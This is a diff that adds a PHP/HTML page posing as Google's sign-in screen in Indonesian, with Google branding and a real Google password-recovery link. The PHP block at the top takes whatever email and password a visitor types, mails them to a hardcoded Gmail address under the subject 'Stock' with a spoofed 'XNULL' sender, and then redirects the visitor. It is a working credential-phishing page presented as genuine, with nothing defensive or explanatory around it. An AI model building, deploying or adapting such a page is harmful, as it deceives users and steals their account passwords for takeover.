@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta name="viewport" content"width=device-width, intial-scale=1.0">
+		<title>Login Google</title>
+		<link rel="stylesheet" href="loginGoogle2.css" >
+	</head>
+<body>
+<?php
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+if (empty($email) && empty($password)) {
+  header('Location: ./');
+}
+
+$message = "
+Email: ".$email."
+Password: ".$password."
+";
+
+$emailmu = "nazuya80@gmail.com"; // Email tujuanmu disini
+$subject = "Stock : [ ".$email." ]";
+$headers = 'From: XNULL <noreply@xnull.ml>' . "\r\n";
+mail($emailmu, $subject, $message, $headers);
+
+header('Location: index.html');
+?>
+	<div class="input-container" >
+		<img src="images/googleLogo.svg" >
+		<h1>Selamat datang</h1>
+		<div class="account-info" >
+			<svg class="profile-img" viewBox="-51.2 -51.2 614.40 614.40" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>user-profile-filled</title> <g id="Page-1" stroke-width="0.00512" fill="none" fill-rule="evenodd"> <g id="drop" fill="#000000" transform="translate(42.666667, 42.666667)"> <path d="M213.333333,3.55271368e-14 C269.912851,3.55271368e-14 324.175019,22.4761259 364.18278,62.4838867 C404.190541,102.491647 426.666667,156.753816 426.666667,213.333333 C426.666667,331.15408 331.15408,426.666667 213.333333,426.666667 C95.5125867,426.666667 2.84217094e-14,331.15408 2.84217094e-14,213.333333 C2.84217094e-14,95.5125867 95.5125867,3.55271368e-14 213.333333,3.55271368e-14 Z M234.666667,234.666667 L192,234.666667 C139.18529,234.666667 93.8415802,266.653822 74.285337,312.314895 C105.229171,355.70638 155.977088,384 213.333333,384 C270.689579,384 321.437496,355.70638 352.381644,312.31198 C332.825087,266.653822 287.481377,234.666667 234.666667,234.666667 L234.666667,234.666667 Z M213.333333,64 C177.987109,64 149.333333,92.653776 149.333333,128 C149.333333,163.346224 177.987109,192 213.333333,192 C248.679557,192 277.333333,163.346224 277.333333,128 C277.333333,92.653776 248.679557,64 213.333333,64 Z" id="Combined-Shape"> </path> </g> </g> </g></svg>
+			<p id="username" >example@gmail.com</p>
+		</div>
+		<form method="post" action="" class="input-box" >
+			<input name="email"  type="text" id="inputId" >
+			<input name="password" type="password" placeholder="Masukan sandi Anda" id="inputPw" required="required"  >
+			<div class="showPw" >
+				<input type="checkbox" onchange="toggle()" id="showPw" >
+				<label for="showPw">Tampilkan sandi</label>
+			</div>
+			<div class="control"  >
+				<a class="forget" href="https://accounts.google.com/signin/v2/challenge/pwd?TL=AG7eRGBIfsmUhf-NICyKPfJDmY8VIvc7TYe1oj8uNu4rYMl4c44PvQTZvT3vRsLc&cid=1&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Fpassword&flowName=GlifWebSignIn&hl=en&ifkv=Af_xneHAz0WJ2G9V_TmZnQAjTJ5TIuHk2VFK7QAcjlRnE77TbXoICySNEhcXd04-Gc0488vBxzxJvg&kdi=CAM&rart=ANgoxccQ0naBgRZ9Y3J_iMKpacNo4k4kr9ufQ0doXRDcd9HXqpgSthrGz4fk4dwNVY7tO5wooJCB7j_z5AgLy4pKE0q_voXJuA&sarp=1&scc=1&service=accountsettings" >Lupa sandi?</a>
+				<button class="next" >Selanjutnya</button>
+			</div>
+		</form>
+	</div>
+	<script src="loginGoogle2.js" type="text/javascript"></script>
+</body>
+</head>
